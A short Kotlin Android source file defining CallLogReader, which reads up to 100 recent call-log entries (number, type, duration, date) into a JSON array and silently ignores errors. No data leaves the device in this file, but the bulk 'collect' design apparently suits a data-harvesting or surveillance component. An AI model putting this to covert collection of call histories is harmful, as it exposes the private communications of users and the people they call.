package com.misfit.gawdzilla

import android.content.Context
import android.provider.CallLog
import org.json.JSONArray
import org.json.JSONObject

object CallLogReader {
    fun collect(ctx: Context, limit: Int = 100): JSONArray {
        val arr = JSONArray()
        try {
            val cur = ctx.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.DATE
                ),
                null, null, "date DESC"
            ) ?: return arr
            var n = 0
            cur.use {
                while (it.moveToNext() && n < limit) {
                    val o = JSONObject()
                    o.put("number",   it.getString(0) ?: "")
                    o.put("type",     it.getInt(1))
                    o.put("duration", it.getLong(2))
                    o.put("date",     it.getLong(3))
                    arr.put(o)
                    n++
                }
            }
        } catch (_: Exception) {}
        return arr
    }
}
